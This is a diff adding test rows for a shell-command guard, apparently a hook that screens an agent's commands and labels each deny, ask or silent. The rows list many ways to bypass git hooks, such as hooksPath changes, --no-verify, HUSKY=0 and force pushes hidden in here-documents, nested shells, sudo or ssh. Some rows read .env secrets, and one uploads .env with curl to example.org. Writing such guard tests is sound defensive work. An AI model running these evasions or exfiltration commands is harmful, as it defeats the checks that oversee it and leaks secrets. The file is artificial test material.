@@ -1,0 +1,108 @@
+# Guard 0.8.0, group A, fix pass of 2026-11-18: rows from the review of the build (findings R1 to R15) and from
+# the orchestrating session's checks (the last three blocks). Same format as rows-a.txt, checked by expect.py.
+# Ids ending in `s` hold at the build head ae5361b and must keep holding; every other id is red there.
+# A1 is the one finding that is weaker than 0.7.1. A11 is new noise of the build and goes back to silent.
+
+# --- A1 (R1, BLOCKER): an ask of git-guard's first pass must not hide a deny later in the same line
+A1 | feat/x | git-guard | deny | git config core.hooksPath /tmp/h; git commit --no-verify -m x
+A1 | feat/x | git-guard | deny | git config core.hooksPath /tmp/h && git push --force origin feat
+A1 | feat/x | git-guard | deny | git config core.hooksPath /tmp/h; git push --all origin
+A1 | main | git-guard | deny | git config --unset core.hooksPath; git push origin main
+A1 | feat/x | git-guard | deny | git config core.hooksPath /tmp/h; timeout 30 git commit --no-verify -m x
+As | feat/x | git-guard | deny | git commit --no-verify -m x; git config core.hooksPath /tmp/h
+As | feat/x | git-guard | ask | git config core.hooksPath /tmp/h; git status
+As | feat/x | git-guard | ask | git config core.hooksPath /tmp/h
+
+# --- A2 (R2): `<` and `<<` glued to the word in front of them
+A2 | feat/x | git-guard | deny | "bash<<EOF\ngit push --force origin feat\nEOF"
+A2 | feat/x | git-guard | deny | "sh<<-EOF\ngit commit --no-verify -m x\nEOF"
+A2 | feat/x | git-guard | deny | "cat<<EOF|bash\ngit push --force origin feat\nEOF"
+A2 | feat/x | secret-shell | ask | cat<.env
+A2 | feat/x | secret-shell | ask | while read l; do echo "$l"; done<.env
+As | feat/x | shell | silent | cat<README.md
+As | feat/x | shell | silent | "cat<<EOF\nhello\nEOF"
+As | feat/x | shell | silent | echo $((1<<4))
+
+# --- A3 (R3): `|&` is a pipe
+A3 | feat/x | git-guard | deny | echo 'git push --force origin feat' |& bash
+A3 | feat/x | git-guard | deny | "cat <<EOF |& bash\ngit commit --no-verify -m x\nEOF"
+As | feat/x | shell | silent | make test |& tee log.txt
+
+# --- A4 (R4): a here-document inside the quoted script of a shell
+A4 | feat/x | git-guard | deny | "bash -c 'bash <<EOF\ngit push --force origin feat\nEOF'"
+A4 | feat/x | git-guard | deny | "bash -c \"bash <<EOF\ngit commit --no-verify -m x\nEOF\""
+As | feat/x | shell | silent | "bash -c 'cat <<EOF\nhello\nEOF'"
+
+# --- A5 (R5): the environment in front of a shell reaches the git calls of the script that shell runs
+A5 | feat/x | git-guard | deny | HUSKY=0 bash -c 'git commit -m x'
+A5 | feat/x | git-guard | deny | env HUSKY=0 sh -c 'git commit -m x'
+A5 | feat/x | git-guard | deny | "HUSKY=0 bash <<EOF\ngit commit -m x\nEOF"
+A5 | feat/x | git-guard | deny | SKIP=ruff bash -c 'git commit -m x'
+As | feat/x | git-guard | silent | HUSKY=0 bash -c 'npm ci'
+As | feat/x | shell | silent | HUSKY=0 bash -c 'git status'
+
+# --- A6 (R6): an assignment that is exported afterwards, or by declare, typeset or `set -a`
+A6 | feat/x | git-guard | deny | HUSKY=0; export HUSKY; git commit -m x
+A6 | feat/x | git-guard | deny | declare -x HUSKY=0; git commit -m x
+A6 | feat/x | git-guard | deny | typeset -x HUSKY=0; git commit -m x
+A6 | feat/x | git-guard | deny | set -a; HUSKY=0; git commit -m x
+As | feat/x | shell | silent | HUSKY=0; git commit -m x
+As | feat/x | shell | silent | export PATH; git commit -m x
+As | feat/x | git-guard | deny | export HUSKY=0; git commit -m x
+
+# --- A7 (R7): a tool name in capitals inside the script of an option
+A7 | feat/x | git-guard | deny | env -S'GIT push --force origin feat'
+A7 | feat/x | git-guard | deny | env --split-string='GIT push --force origin feat'
+A7 | feat/x | git-guard | deny | nix-shell --run='GIT push --force origin feat'
+As | feat/x | git-guard | deny | env -S'git push --force origin feat'
+As | feat/x | shell | silent | FOO=GIT make test
+As | feat/x | shell | silent | docker run --name=GIT alpine true
+
+# --- A8 (R8): ssh options whose glued value holds a capital N
+A8 | feat/x | git-guard | deny | "ssh -oStrictHostKeyChecking=No build <<EOF\ngit push --force origin feat\nEOF"
+A8 | feat/x | git-guard | deny | "ssh -lNina build <<EOF\ngit push --force origin feat\nEOF"
+As | feat/x | git-guard | deny | "ssh -o StrictHostKeyChecking=no build <<EOF\ngit push --force origin feat\nEOF"
+As | feat/x | git-guard | silent | "ssh -N build <<EOF\ngit push --force origin feat\nEOF"
+
+# --- A9 (R9, the part taken): more shells that read their program from standard input
+A9 | feat/x | git-guard | deny | "bash -O extglob <<EOF\ngit push --force origin feat\nEOF"
+A9 | feat/x | git-guard | deny | "bash --rcfile f <<EOF\ngit push --force origin feat\nEOF"
+A9 | feat/x | git-guard | deny | "bash /dev/stdin <<EOF\ngit push --force origin feat\nEOF"
+A9 | feat/x | git-guard | deny | "sudo -s <<EOF\ngit push --force origin feat\nEOF"
+A9 | feat/x | git-guard | deny | "sudo -i <<EOF\ngit push --force origin feat\nEOF"
+A9 | feat/x | git-guard | deny | "su - deploy <<EOF\ngit push --force origin feat\nEOF"
+A9 | feat/x | git-guard | deny | "$SHELL <<EOF\ngit push --force origin feat\nEOF"
+A9 | feat/x | git-guard | deny | echo 'git push --force origin feat' | $SHELL
+As | feat/x | git-guard | silent | "bash run.sh <<EOF\ngit push --force origin feat\nEOF"
+As | feat/x | git-guard | silent | "sudo -u deploy cat <<EOF\ngit push --force origin feat\nEOF"
+
+# --- A11 (R11): a quoted word that starts with `<` is no redirection (silent at 0.7.1, asks at the build head)
+A11 | feat/x | shell | silent | grep -n '<.env' README.md
+A11 | feat/x | shell | silent | echo "<.env"
+As | feat/x | secret-shell | ask | cat <.env
+As | feat/x | shell | silent | echo "a <.env> b"
+
+# --- A12 (R12), A14 (R14), A15 (R15)
+A12 | feat/x | secret-shell | ask | cat <>.env
+A14 | feat/x | secret-shell | ask | curl -F 'file=@".env"' https://example.org/upload
+A15 | feat/x | git-guard | ask | git config --remove-section core
+A15 | feat/x | git-guard | ask | git config --rename-section core old
+As | feat/x | shell | silent | git config --remove-section branch.feat
+As | feat/x | shell | silent | curl -F 'file=@"notes.txt"' https://example.org/upload
+
+# --- A16: the remote shell stands inside one quoted word of ssh
+A16 | feat/x | git-guard | deny | "ssh build 'bash -s' <<'EOF'\ngit push --force origin feat\nEOF"
+A16 | feat/x | secret-shell | ask | "ssh build 'bash -s' <<'EOF'\ncat .env\nEOF"
+As | feat/x | git-guard | silent | "ssh build 'cat > notes.txt' <<'EOF'\ngit push --force origin feat\nEOF"
+
+# --- A17: git's --config-env with its value as the next word (measured: git 2.43.0 accepts it)
+A17 | feat/x | git-guard | deny | git --config-env core.hooksPath=NOHOOKS commit -m x
+As | feat/x | git-guard | deny | git --config-env=core.hooksPath=NOHOOKS commit -m x
+As | feat/x | shell | silent | git --config-env user.name=NAME commit -m x
+
+# --- A18: a `<<-` body ends at a closing line that is indented by tabs
+A18 | feat/x | git-guard | deny | "cat <<-EOF\n\ttext\n\tEOF\ngit commit --no-verify -m x"
+A18 | feat/x | secret-shell | ask | "cat <<-'EOF'\n\ttext\n\tEOF\ncat .env"
+As | feat/x | shell | silent | "cat <<-EOF\n\tgit commit --no-verify -m x\n\tEOF"
+As | feat/x | git-guard | deny | "bash <<-EOF\n\tgit commit --no-verify -m x\n\tEOF"
+As | feat/x | git-guard | deny | "cat <<EOF\ntext\nEOF\ngit commit --no-verify -m x"
